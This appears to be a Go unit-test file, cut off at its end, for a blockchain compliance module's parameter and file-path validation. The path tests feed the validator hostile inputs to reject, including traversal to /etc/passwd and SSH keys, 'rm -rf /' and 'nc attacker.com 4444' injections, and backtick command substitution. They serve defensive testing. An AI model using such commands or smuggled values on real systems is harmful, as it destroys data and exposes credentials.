// Copyright 2024-2025 Aequitas Foundation
// SPDX-License-Identifier: Apache-2.0

package types

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// ============================================================================
// ValidateParams Tests
// ============================================================================

func TestValidateParams_Valid(t *testing.T) {
	params := ComplianceParams{
		KycRequired:                  true,
		MinimumKycLevel:              KYCLevel_KYC_LEVEL_BASIC,
		KycExpiryDays:                365,
		TransactionMonitoringEnabled: true,
		VelocityLimit_24H:            "1000000",
		SingleTransactionLimit:       "100000",
		StructuringThresholdCount:    10,
		SanctionsScreeningEnabled:    true,
		SanctionsLists:               []string{"OFAC", "EU", "UN"},
		ScreeningCacheHours:          24,
		GdprEnabled:                  true,
		DataRetentionDays:            730,
		ProcessingPurposes:           []string{"compliance", "analytics"},
		TaxReportingEnabled:          true,
		TaxJurisdictions:             []string{"US", "EU"},
		TaxYearEnd:                   "12-31",
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_EmptyParams(t *testing.T) {
	params := ComplianceParams{}
	err := ValidateParams(params)
	require.NoError(t, err) // All params are optional
}

func TestValidateParams_PartialParams(t *testing.T) {
	params := ComplianceParams{
		KycRequired:     true,
		KycExpiryDays:   365,
		MinimumKycLevel: KYCLevel_KYC_LEVEL_ADVANCED,
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_AllFieldsSet(t *testing.T) {
	params := ComplianceParams{
		KycRequired:                  false,
		MinimumKycLevel:              KYCLevel_KYC_LEVEL_NONE,
		KycExpiryDays:                0,
		TransactionMonitoringEnabled: false,
		VelocityLimit_24H:            "0",
		SingleTransactionLimit:       "0",
		StructuringThresholdCount:    0,
		SanctionsScreeningEnabled:    false,
		SanctionsLists:               []string{},
		ScreeningCacheHours:          0,
		GdprEnabled:                  false,
		DataRetentionDays:            0,
		ProcessingPurposes:           []string{},
		TaxReportingEnabled:          false,
		TaxJurisdictions:             []string{},
		TaxYearEnd:                   "",
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_MaxValues(t *testing.T) {
	params := ComplianceParams{
		KycRequired:                  true,
		MinimumKycLevel:              KYCLevel_KYC_LEVEL_ADVANCED,
		KycExpiryDays:                365 * 10, // At max allowed
		TransactionMonitoringEnabled: true,
		VelocityLimit_24H:            "999999999999999",
		SingleTransactionLimit:       "999999999999999",
		StructuringThresholdCount:    10000, // At max allowed
		SanctionsScreeningEnabled:    true,
		SanctionsLists:               []string{"LIST1", "LIST2", "LIST3", "LIST4", "LIST5"},
		ScreeningCacheHours:          24 * 30, // At max allowed
		GdprEnabled:                  true,
		DataRetentionDays:            365 * 20, // At max allowed
		ProcessingPurposes:           []string{"purpose1", "purpose2", "purpose3"},
		TaxReportingEnabled:          true,
		TaxJurisdictions:             []string{"US", "EU", "UK", "CA"},
		TaxYearEnd:                   "12-31",
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_MultipleSanctionsLists(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningEnabled: true,
		SanctionsLists:            []string{"OFAC", "EU", "UN", "UK", "CANADA"},
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_EmptySanctionsListsWhenDisabled(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningEnabled: false,
		SanctionsLists:            []string{},
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_MultipleJurisdictions(t *testing.T) {
	params := ComplianceParams{
		TaxReportingEnabled: true,
		TaxJurisdictions:    []string{"US", "EU", "UK", "CA", "AU", "NZ"},
		TaxYearEnd:          "12-31",
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_DifferentKYCLevels(t *testing.T) {
	levels := []KYCLevel{
		KYCLevel_KYC_LEVEL_UNSPECIFIED,
		KYCLevel_KYC_LEVEL_NONE,
		KYCLevel_KYC_LEVEL_BASIC,
		KYCLevel_KYC_LEVEL_INTERMEDIATE,
		KYCLevel_KYC_LEVEL_ADVANCED,
	}

	for _, level := range levels {
		params := ComplianceParams{
			MinimumKycLevel: level,
		}
		err := ValidateParams(params)
		require.NoError(t, err, "level %v should be valid", level)
	}
}

// ============================================================================
// DefaultParams Tests
// ============================================================================

func TestDefaultParams(t *testing.T) {
	params := DefaultParams()

	require.NotNil(t, params)
	require.False(t, params.KycRequired)
	require.Equal(t, KYCLevel(0), params.MinimumKycLevel)
	require.Equal(t, uint64(365), params.KycExpiryDays)
	require.False(t, params.TransactionMonitoringEnabled)
	require.Equal(t, "1000000", params.VelocityLimit_24H)
	require.Equal(t, "100000", params.SingleTransactionLimit)
	require.Equal(t, uint32(10), params.StructuringThresholdCount)
	require.False(t, params.SanctionsScreeningEnabled)
	require.Empty(t, params.SanctionsLists)
	require.Equal(t, uint64(24), params.ScreeningCacheHours)
}

func TestDefaultParams_IsValid(t *testing.T) {
	params := DefaultParams()
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestDefaultParams_CanBeModified(t *testing.T) {
	params := DefaultParams()
	params.KycRequired = true
	params.MinimumKycLevel = KYCLevel_KYC_LEVEL_ADVANCED
	params.SanctionsLists = []string{"OFAC", "EU"}

	err := ValidateParams(params)
	require.NoError(t, err)
}

// ============================================================================
// Helper Types Tests
// ============================================================================

func TestTransactionAlertList(t *testing.T) {
	list := TransactionAlertList{
		Alerts: []*TransactionAlert{
			{
				Id:      "alert1",
				Address: "cosmos1test",
			},
			{
				Id:      "alert2",
				Address: "cosmos1test2",
			},
		},
	}

	require.Len(t, list.Alerts, 2)
	require.Equal(t, "alert1", list.Alerts[0].Id)
	require.Equal(t, "alert2", list.Alerts[1].Id)
}

func TestTransactionAlertList_Empty(t *testing.T) {
	list := TransactionAlertList{
		Alerts: []*TransactionAlert{},
	}

	require.NotNil(t, list.Alerts)
	require.Empty(t, list.Alerts)
}

func TestGDPRConsentList(t *testing.T) {
	list := GDPRConsentList{
		Consents: []*GDPRConsent{
			{
				Address:     "cosmos1test",
				ConsentType: "data_processing",
				Consented:   true,
			},
			{
				Address:     "cosmos1test",
				ConsentType: "marketing",
				Consented:   false,
			},
		},
	}

	require.Len(t, list.Consents, 2)
	require.True(t, list.Consents[0].Consented)
	require.False(t, list.Consents[1].Consented)
}

func TestGDPRConsentList_Empty(t *testing.T) {
	list := GDPRConsentList{
		Consents: []*GDPRConsent{},
	}

	require.NotNil(t, list.Consents)
	require.Empty(t, list.Consents)
}

func TestTaxReportList(t *testing.T) {
	list := TaxReportList{
		Reports: []*TaxReport{
			{
				Id:      "report1",
				Address: "cosmos1test",
				TaxYear: "2023",
			},
			{
				Id:      "report2",
				Address: "cosmos1test",
				TaxYear: "2024",
			},
		},
	}

	require.Len(t, list.Reports, 2)
	require.Equal(t, "2023", list.Reports[0].TaxYear)
	require.Equal(t, "2024", list.Reports[1].TaxYear)
}

func TestTaxReportList_Empty(t *testing.T) {
	list := TaxReportList{
		Reports: []*TaxReport{},
	}

	require.NotNil(t, list.Reports)
	require.Empty(t, list.Reports)
}

// ============================================================================
// Invalid Parameter Tests
// ============================================================================

func TestValidateParams_InvalidKYCExpiryDays(t *testing.T) {
	params := ComplianceParams{
		KycExpiryDays: 365*10 + 1, // Exceeds max
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc_expiry_days too large")
}

func TestValidateParams_KYCRequiredWithZeroExpiry(t *testing.T) {
	params := ComplianceParams{
		KycRequired:   true,
		KycExpiryDays: 0,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc_expiry_days must be positive when kyc_required is true")
}

func TestValidateParams_KYCRequiredWithInvalidLevel(t *testing.T) {
	params := ComplianceParams{
		KycRequired:     true,
		KycExpiryDays:   365,
		MinimumKycLevel: KYCLevel_KYC_LEVEL_NONE,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "minimum_kyc_level must be at least BASIC")
}

func TestValidateParams_NegativeVelocityLimit(t *testing.T) {
	params := ComplianceParams{
		VelocityLimit_24H: "-1000",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "velocity_limit_24h cannot be negative")
}

func TestValidateParams_InvalidVelocityLimitFormat(t *testing.T) {
	params := ComplianceParams{
		VelocityLimit_24H: "not-a-number",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "velocity_limit_24h must be a decimal integer")
}

func TestValidateParams_NegativeSingleTransactionLimit(t *testing.T) {
	params := ComplianceParams{
		SingleTransactionLimit: "-500",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "single_transaction_limit cannot be negative")
}

func TestValidateParams_InvalidSingleTransactionLimitFormat(t *testing.T) {
	params := ComplianceParams{
		SingleTransactionLimit: "invalid",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "single_transaction_limit must be a decimal integer")
}

func TestValidateParams_SingleTransactionExceedsVelocity(t *testing.T) {
	params := ComplianceParams{
		VelocityLimit_24H:      "1000",
		SingleTransactionLimit: "2000",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "single_transaction_limit")
	require.Contains(t, err.Error(), "cannot exceed velocity_limit_24h")
}

func TestValidateParams_MonitoringEnabledWithZeroThreshold(t *testing.T) {
	params := ComplianceParams{
		TransactionMonitoringEnabled: true,
		StructuringThresholdCount:    0,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "structuring_threshold_count must be positive")
}

func TestValidateParams_StructuringThresholdTooLarge(t *testing.T) {
	params := ComplianceParams{
		StructuringThresholdCount: 10001, // Exceeds max
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "structuring_threshold_count too large")
}

func TestValidateParams_ScreeningCacheHoursTooLarge(t *testing.T) {
	params := ComplianceParams{
		ScreeningCacheHours: 24*30 + 1, // Exceeds max
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "screening_cache_hours too large")
}

func TestValidateParams_SanctionsEnabledWithEmptyLists(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningEnabled: true,
		SanctionsLists:            []string{},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sanctions_lists cannot be empty")
}

func TestValidateParams_SanctionsListWithEmptyEntry(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningEnabled: true,
		SanctionsLists:            []string{"OFAC", "", "EU"},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sanctions_lists contains empty")
}

func TestValidateParams_SanctionsListNameTooLong(t *testing.T) {
	longName := string(make([]byte, 101))
	params := ComplianceParams{
		SanctionsScreeningEnabled: true,
		SanctionsLists:            []string{longName},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sanctions list name too long")
}

func TestValidateParams_DataRetentionDaysTooLarge(t *testing.T) {
	params := ComplianceParams{
		DataRetentionDays: 365*20 + 1, // Exceeds max
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "data_retention_days too large")
}

func TestValidateParams_GDPREnabledWithZeroRetention(t *testing.T) {
	params := ComplianceParams{
		GdprEnabled:       true,
		DataRetentionDays: 0,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "data_retention_days must be positive when gdpr_enabled is true")
}

func TestValidateParams_GDPREnabledWithEmptyPurposes(t *testing.T) {
	params := ComplianceParams{
		GdprEnabled:        true,
		DataRetentionDays:  365,
		ProcessingPurposes: []string{},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "processing_purposes cannot be empty")
}

func TestValidateParams_ProcessingPurposeWithEmptyEntry(t *testing.T) {
	params := ComplianceParams{
		GdprEnabled:        true,
		DataRetentionDays:  365,
		ProcessingPurposes: []string{"compliance", "", "analytics"},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "processing_purposes contains empty")
}

func TestValidateParams_ProcessingPurposeTooLong(t *testing.T) {
	longPurpose := string(make([]byte, 201))
	params := ComplianceParams{
		GdprEnabled:        true,
		DataRetentionDays:  365,
		ProcessingPurposes: []string{longPurpose},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "processing purpose too long")
}

func TestValidateParams_TaxReportingEnabledWithEmptyJurisdictions(t *testing.T) {
	params := ComplianceParams{
		TaxReportingEnabled: true,
		TaxYearEnd:          "12-31",
		TaxJurisdictions:    []string{},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "tax_jurisdictions cannot be empty")
}

func TestValidateParams_TaxReportingEnabledWithoutYearEnd(t *testing.T) {
	params := ComplianceParams{
		TaxReportingEnabled: true,
		TaxJurisdictions:    []string{"US"},
		TaxYearEnd:          "",
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "tax_year_end must be set")
}

func TestValidateParams_InvalidTaxYearEndFormat(t *testing.T) {
	testCases := []struct {
		name    string
		yearEnd string
	}{
		{"missing day", "12"},
		{"too many parts", "12-31-2024"},
		{"invalid month", "13-31"},
		{"invalid day", "12-32"},
		{"zero month", "00-15"},
		{"zero day", "06-00"},
		{"invalid February", "02-30"},
		{"invalid April", "04-31"},
		{"non-numeric", "AA-BB"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			params := ComplianceParams{
				TaxYearEnd: tc.yearEnd,
			}
			err := ValidateParams(params)
			require.Error(t, err, "Expected error for year end: %s", tc.yearEnd)
			require.Contains(t, err.Error(), "tax_year_end")
		})
	}
}

func TestValidateParams_InvalidJurisdictionCode(t *testing.T) {
	testCases := []struct {
		name         string
		jurisdiction string
	}{
		{"too short", "U"},
		{"too long", "USA"},
		{"lowercase", "us"},
		{"numbers only", "12"},
		{"empty", ""},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			params := ComplianceParams{
				BlockedJurisdictions: []string{tc.jurisdiction},
			}
			err := ValidateParams(params)
			require.Error(t, err, "Expected error for jurisdiction: %s", tc.jurisdiction)
			require.Contains(t, err.Error(), "invalid")
		})
	}
}

func TestValidateParams_EmptyKYCProviderAddress(t *testing.T) {
	params := ComplianceParams{
		ApprovedKycProviders: []string{"cosmos1validaddress", ""},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "approved_kyc_providers contains empty")
}

func TestValidateParams_DuplicateKYCProvider(t *testing.T) {
	params := ComplianceParams{
		ApprovedKycProviders: []string{"cosmos1provider1", "cosmos1provider2", "cosmos1provider1"},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "duplicate kyc provider")
}

func TestValidateParams_KYCProviderAddressTooShort(t *testing.T) {
	params := ComplianceParams{
		ApprovedKycProviders: []string{"short"},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc provider address too short")
}

func TestValidateParams_KYCProviderAddressTooLong(t *testing.T) {
	longAddress := string(make([]byte, 101))
	params := ComplianceParams{
		ApprovedKycProviders: []string{longAddress},
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc provider address too long")
}

// ============================================================================
// Valid Edge Cases Tests
// ============================================================================

func TestValidateParams_ValidExtendedJurisdictionCodes(t *testing.T) {
	params := ComplianceParams{
		BlockedJurisdictions: []string{"US", "US-NY", "CA-ON", "GB-ENG"},
		TaxJurisdictions:     []string{"US", "US-CA", "EU-DE"},
	}
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_ValidTaxYearEnds(t *testing.T) {
	testCases := []string{
		"12-31",
		"01-01",
		"06-30",
		"03-31",
		"02-29", // Leap year day
		"04-30", // 30-day month
	}

	for _, yearEnd := range testCases {
		t.Run(yearEnd, func(t *testing.T) {
			params := ComplianceParams{
				TaxYearEnd: yearEnd,
			}
			err := ValidateParams(params)
			require.NoError(t, err, "Should accept valid year end: %s", yearEnd)
		})
	}
}

func TestValidateParams_BoundaryValues(t *testing.T) {
	params := ComplianceParams{
		KycExpiryDays:             365 * 10,       // Exactly at max
		StructuringThresholdCount: 10000,          // Exactly at max
		ScreeningCacheHours:       24 * 30,        // Exactly at max
		DataRetentionDays:         365 * 20,       // Exactly at max
		VelocityLimit_24H:         "999999999999", // Large valid number
		SingleTransactionLimit:    "999999999999", // Large valid number
	}
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_ConsistentLimits(t *testing.T) {
	params := ComplianceParams{
		VelocityLimit_24H:      "1000000",
		SingleTransactionLimit: "1000000", // Equal is allowed
	}
	err := ValidateParams(params)
	require.NoError(t, err)
}

// ============================================================================
// Edge Cases
// ============================================================================

func TestValidateParams_NilSlices(t *testing.T) {
	params := ComplianceParams{
		SanctionsLists:     nil,
		ProcessingPurposes: nil,
		TaxJurisdictions:   nil,
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_LargeNumbers(t *testing.T) {
	// Test that very large numbers within allowed bounds are accepted
	params := ComplianceParams{
		KycExpiryDays:             365 * 10, // At max allowed
		StructuringThresholdCount: 10000,    // At max allowed
		ScreeningCacheHours:       24 * 30,  // At max allowed
		DataRetentionDays:         365 * 20, // At max allowed
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_VeryLargeStrings(t *testing.T) {
	// Test large numeric strings (should fail if not valid numbers)
	params := ComplianceParams{
		VelocityLimit_24H:      "999999999999999999999999999999",
		SingleTransactionLimit: "888888888888888888888888888888",
	}

	// These should be valid as long as they're parseable as integers
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_SpecialCharacters(t *testing.T) {
	params := ComplianceParams{
		SanctionsLists:     []string{"OFAC-SDN", "EU_LIST", "UN.LIST", "UK/LIST"},
		ProcessingPurposes: []string{"compliance & analytics", "reporting@domain"},
		TaxJurisdictions:   []string{"US-NY", "CA-ON"}, // Valid extended format
		TaxYearEnd:         "12-31",                    // Must use dash format
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

// ============================================================================
// Type Alias Tests
// ============================================================================

func TestKYCLevelConstants(t *testing.T) {
	require.Equal(t, KYCLevel(0), KYCLevel_KYC_LEVEL_UNSPECIFIED)
	require.Equal(t, KYCLevel(1), KYCLevel_KYC_LEVEL_NONE)
	require.Equal(t, KYCLevel(2), KYCLevel_KYC_LEVEL_BASIC)
	require.Equal(t, KYCLevel(3), KYCLevel_KYC_LEVEL_INTERMEDIATE)
	require.Equal(t, KYCLevel(4), KYCLevel_KYC_LEVEL_ADVANCED)
}

func TestAMLRiskLevelConstants(t *testing.T) {
	require.Equal(t, AMLRiskLevel(0), AMLRiskLevel_AML_RISK_UNSPECIFIED)
	require.Equal(t, AMLRiskLevel(1), AMLRiskLevel_AML_RISK_LOW)
	require.Equal(t, AMLRiskLevel(2), AMLRiskLevel_AML_RISK_MEDIUM)
	require.Equal(t, AMLRiskLevel(3), AMLRiskLevel_AML_RISK_HIGH)
	require.Equal(t, AMLRiskLevel(4), AMLRiskLevel_AML_RISK_SEVERE)
}

func TestTransactionRiskLevelConstants(t *testing.T) {
	require.Equal(t, TransactionRiskLevel(0), TransactionRiskLevel_TX_RISK_UNSPECIFIED)
	require.Equal(t, TransactionRiskLevel(1), TransactionRiskLevel_TX_RISK_LOW)
	require.Equal(t, TransactionRiskLevel(2), TransactionRiskLevel_TX_RISK_MEDIUM)
	require.Equal(t, TransactionRiskLevel(3), TransactionRiskLevel_TX_RISK_HIGH)
	require.Equal(t, TransactionRiskLevel(4), TransactionRiskLevel_TX_RISK_CRITICAL)
}

func TestSanctionsStatusConstants(t *testing.T) {
	require.Equal(t, SanctionsStatus(0), SanctionsStatus_SANCTIONS_UNSPECIFIED)
	require.Equal(t, SanctionsStatus(1), SanctionsStatus_SANCTIONS_CLEAR)
	require.Equal(t, SanctionsStatus(2), SanctionsStatus_SANCTIONS_MATCH)
	require.Equal(t, SanctionsStatus(3), SanctionsStatus_SANCTIONS_CONFIRMED)
	require.Equal(t, SanctionsStatus(4), SanctionsStatus_SANCTIONS_PENDING_REVIEW)
}

// ============================================================================
// ValidateFilePath Tests
// ============================================================================

func TestValidateFilePath_Valid(t *testing.T) {
	validPaths := []string{
		"reports/tax_2023.pdf",
		"tax_reports/user_reports/report_001.csv",
		"output.json",
		"tax-report-2023.pdf",
		"report_123.txt",
		"reports/2023/12/31/summary.xml",
		"valid_name_with_underscores.pdf",
		"valid-name-with-dashes.csv",
	}

	for _, path := range validPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.NoError(t, err, "Expected valid path: %s", path)
		})
	}
}

func TestValidateFilePath_EmptyPath(t *testing.T) {
	err := ValidateFilePath("")
	require.Error(t, err)
	require.Contains(t, err.Error(), "cannot be empty")
}

func TestValidateFilePath_AbsolutePaths(t *testing.T) {
	absolutePaths := []string{
		"/etc/passwd",
		"/var/log/attack.txt",
		"/home/user/sensitive.dat",
		"/tmp/exploit.sh",
		"/root/.ssh/id_rsa",
	}

	for _, path := range absolutePaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject absolute path: %s", path)
			require.Contains(t, err.Error(), "absolute paths not allowed")
		})
	}
}

func TestValidateFilePath_WindowsAbsolutePaths(t *testing.T) {
	windowsPaths := []string{
		"C:\\Windows\\System32\\config\\SAM",
		"D:\\sensitive\\data.db",
		"E:/other/path/file.txt",
		"C:/Windows/win.ini",
	}

	for _, path := range windowsPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject Windows absolute path: %s", path)
			require.Contains(t, err.Error(), "Windows-style absolute paths not allowed")
		})
	}
}

func TestValidateFilePath_PathTraversal(t *testing.T) {
	traversalPaths := []string{
		"../../../etc/passwd",
		"reports/../../etc/shadow",
		"../sensitive.txt",
		"reports/../../../root/.ssh/id_rsa",
		"./reports/../../exploit.sh",
		"reports/../outside.txt",
		"..\\..\\windows\\system32\\config\\sam", // Windows-style
	}

	for _, path := range traversalPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject path traversal: %s", path)
			require.Contains(t, err.Error(), "path traversal")
		})
	}
}

func TestValidateFilePath_SuspiciousCharacters(t *testing.T) {
	suspiciousChars := []struct {
		path string
		char string
	}{
		{"report<script>.pdf", "<"},
		{"report>output.txt", ">"},
		{"report|command.sh", "|"},
		{"report\"inject.csv", "\""},
		{"report'inject.xml", "'"},
		{"report`command`.log", "`"},
		{"<img src=x>", "<"},
		{">redirect.txt", ">"},
		{"cmd|pipe", "|"},
	}

	for _, tc := range suspiciousChars {
		t.Run(tc.path, func(t *testing.T) {
			err := ValidateFilePath(tc.path)
			require.Error(t, err, "Should reject suspicious character %s in path: %s", tc.char, tc.path)
			require.Contains(t, err.Error(), "invalid character")
		})
	}
}

func TestValidateFilePath_NullBytes(t *testing.T) {
	paths := []string{
		"report\x00.pdf",
		"reports/\x00hidden.txt",
		"\x00malicious.sh",
	}

	for _, path := range paths {
		t.Run("null_byte_test", func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject null byte in path")
			require.Contains(t, err.Error(), "null bytes not allowed")
		})
	}
}

func TestValidateFilePath_ControlCharacters(t *testing.T) {
	paths := []string{
		"report\ninjection.txt", // newline
		"report\rinjection.txt", // carriage return
		"report\x01hidden.txt",  // SOH
		"report\x1Bhidden.txt",  // ESC
		"report\x00null.txt",    // null
	}

	for _, path := range paths {
		t.Run("control_char_test", func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject control characters in path")
			require.True(t,
				strings.Contains(err.Error(), "control characters not allowed") ||
					strings.Contains(err.Error(), "null bytes not allowed"),
				"Error should mention control or null characters: %v", err)
		})
	}
}

func TestValidateFilePath_WhitespaceOnly(t *testing.T) {
	whitespacePaths := []string{
		"   ",
		"\t\t",
		"  \n  ",
		"\r\n",
	}

	for _, path := range whitespacePaths {
		t.Run("whitespace_test", func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject whitespace-only path")
			require.True(t,
				strings.Contains(err.Error(), "whitespace only") ||
					strings.Contains(err.Error(), "control characters not allowed"),
				"Error should mention whitespace or control characters: %v", err)
		})
	}
}

func TestValidateFilePath_HiddenFiles(t *testing.T) {
	hiddenPaths := []string{
		".hidden",
		".ssh/id_rsa",
		"reports/.secret.txt",
		".bashrc",
		".env",
	}

	for _, path := range hiddenPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject hidden file path: %s", path)
			require.Contains(t, err.Error(), "hidden file paths not allowed")
		})
	}
}

func TestValidateFilePath_ConsecutiveSlashes(t *testing.T) {
	testCases := []struct {
		path    string
		errMsgs []string
	}{
		{
			path:    "reports//file.txt",
			errMsgs: []string{"consecutive slashes not allowed"},
		},
		{
			path:    "reports///deep///file.pdf",
			errMsgs: []string{"consecutive slashes not allowed"},
		},
		{
			path: "//etc//passwd",
			// This path is caught by either absolute path check OR consecutive slashes check
			errMsgs: []string{"consecutive slashes not allowed", "absolute paths not allowed"},
		},
		{
			path:    "a//b//c.txt",
			errMsgs: []string{"consecutive slashes not allowed"},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.path, func(t *testing.T) {
			err := ValidateFilePath(tc.path)
			require.Error(t, err, "Should reject consecutive slashes: %s", tc.path)

			// Check if error message contains at least one of the expected messages
			found := false
			for _, msg := range tc.errMsgs {
				if strings.Contains(err.Error(), msg) {
					found = true
					break
				}
			}
			require.True(t, found, "Error should contain one of %v, got: %v", tc.errMsgs, err.Error())
		})
	}
}

func TestValidateFilePath_RelativeComponents(t *testing.T) {
	paths := []string{
		"./report.txt",
		"reports/./file.pdf",
		"./././hidden.txt",
		"reports/../other/file.txt",
	}

	for _, path := range paths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.Error(t, err, "Should reject relative path components: %s", path)
			require.True(t,
				strings.Contains(err.Error(), "relative path components") ||
					strings.Contains(err.Error(), "path traversal") ||
					strings.Contains(err.Error(), "hidden file paths"),
				"Error should mention relative components, traversal, or hidden files: %v", err)
		})
	}
}

func TestValidateFilePath_PathTooLong(t *testing.T) {
	// Create a path longer than 4096 bytes
	longPath := strings.Repeat("a", 4097)
	err := ValidateFilePath(longPath)
	require.Error(t, err)
	require.Contains(t, err.Error(), "file path too long")
}

func TestValidateFilePath_EdgeCases(t *testing.T) {
	testCases := []struct {
		name      string
		path      string
		shouldErr bool
		errText   string
	}{
		{
			name:      "single file name",
			path:      "report.pdf",
			shouldErr: false,
		},
		{
			name:      "deep nested path",
			path:      "a/b/c/d/e/f/g/h/i/j/file.txt",
			shouldErr: false,
		},
		{
			name:      "file with numbers",
			path:      "report_2023_12_31.pdf",
			shouldErr: false,
		},
		{
			name:      "mixed case",
			path:      "Reports/Tax/Year2023/Final.PDF",
			shouldErr: false,
		},
		{
			name:      "trailing slash",
			path:      "reports/",
			shouldErr: false,
		},
		{
			name:      "unicode characters",
			path:      "rapport_année_2023.pdf",
			shouldErr: false,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateFilePath(tc.path)
			if tc.shouldErr {
				require.Error(t, err, "Expected error for path: %s", tc.path)
				if tc.errText != "" {
					require.Contains(t, err.Error(), tc.errText)
				}
			} else {
				require.NoError(t, err, "Expected valid path: %s", tc.path)
			}
		})
	}
}

func TestValidateFilePath_SecurityAttackVectors(t *testing.T) {
	// Test comprehensive attack vectors that should all be blocked
	attackVectors := []struct {
		name string
		path string
		desc string
	}{
		{
			name: "classic_traversal",
			path: "../../../../etc/passwd",
			desc: "Classic directory traversal to /etc/passwd",
		},
		{
			name: "null_byte_injection",
			path: "report.pdf\x00.txt",
			desc: "Null byte injection to bypass extension checks",
		},
		{
			name: "command_injection",
			path: "report.pdf;rm -rf /",
			desc: "Command injection via semicolon",
		},
		{
			name: "encoded_traversal",
			path: "..%2F..%2Fetc%2Fpasswd",
			desc: "URL-encoded directory traversal",
		},
		{
			name: "double_encoded",
			path: "..%252F..%252Fetc%252Fpasswd",
			desc: "Double URL-encoded traversal",
		},
		{
			name: "backslash_traversal",
			path: "..\\..\\windows\\system32",
			desc: "Windows-style backslash traversal",
		},
		{
			name: "mixed_traversal",
			path: "../.\\../etc/passwd",
			desc: "Mixed forward/backslash traversal",
		},
		{
			name: "absolute_unix",
			path: "/etc/shadow",
			desc: "Direct absolute Unix path",
		},
		{
			name: "absolute_windows",
			path: "C:\\Windows\\System32\\config\\SAM",
			desc: "Direct absolute Windows path",
		},
		{
			name: "pipe_injection",
			path: "report.pdf|nc attacker.com 4444",
			desc: "Pipe command injection",
		},
		{
			name: "backtick_command",
			path: "report_`whoami`.pdf",
			desc: "Backtick command substitution",
		},
		{
			name: "hidden_ssh_key",
			path: ".ssh/id_rsa",
			desc: "Access to hidden SSH private key",
		},
		{
			name: "hidden_env",
			path: ".env",
			desc: "Access to hidden environment file",
		},
	}

	for _, tc := range attackVectors {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateFilePath(tc.path)
			require.Error(t, err, "Attack vector should be blocked: %s (%s)", tc.desc, tc.path)
		})
	}
}

func TestValidateFilePath_AllowedSpecialChars(t *testing.T) {
	// Characters that SHOULD be allowed in filenames
	allowedPaths := []string{
		"report-2023.pdf",
		"report_final.csv",
		"my report (final).txt",
		"report.v1.2.3.json",
		"report@2023.xml",
		"report#123.log",
		"report+data.txt",
		"report=value.csv",
